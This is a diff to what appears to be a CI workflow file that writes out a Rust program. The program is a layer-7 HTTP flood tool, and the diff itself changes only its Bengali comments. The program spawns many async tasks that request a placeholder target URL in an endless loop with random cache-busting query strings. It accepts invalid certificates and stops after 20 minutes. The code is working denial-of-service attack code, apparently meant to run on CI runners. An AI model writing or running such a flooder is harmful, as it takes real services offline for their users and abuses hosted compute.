@@ -32,7 +32,7 @@ jobs:
 
           #[tokio::main]
           async fn main() {
-              let target = "http://YOUR_TARGET_URL"; // জিহাদ, এখানে তোমার লিংক দাও
+              let target = "http://YOUR_TARGET_URL"; // জিহাদ, এখানে লিংক দাও
               let client = Client::builder()
                   .danger_accept_invalid_certs(true)
                   .tcp_keepalive(Some(Duration::from_secs(60)))
@@ -47,14 +47,14 @@ jobs:
                   
                   handles.push(tokio::spawn(async move {
                       loop {
-                          // ফিক্সড: সরাসরি rand::random ব্যবহার করা হয়েছে যা থ্রেড-সেফ
+                          // ফিক্সড: rand::random() থ্রেড-সেফ এবং await এর সময় এরর দেয় না
                           let random_id: u64 = rand::random();
                           let url = format!("{}?vortex={}", target_ref, random_id);
                           let _ = client_ref.get(&url).send().await;
                       }
                   }));
               }
-              // ২০ মিনিট পর অটোমেটিক বন্ধ হওয়ার টাইমার
+              // ২০ মিনিট পর অটো-স্টপ টাইমার
               tokio::time::sleep(Duration::from_secs(1200)).await;
               println!("🛑 Timer complete. Shutting down.");
           }' > src/main.rs
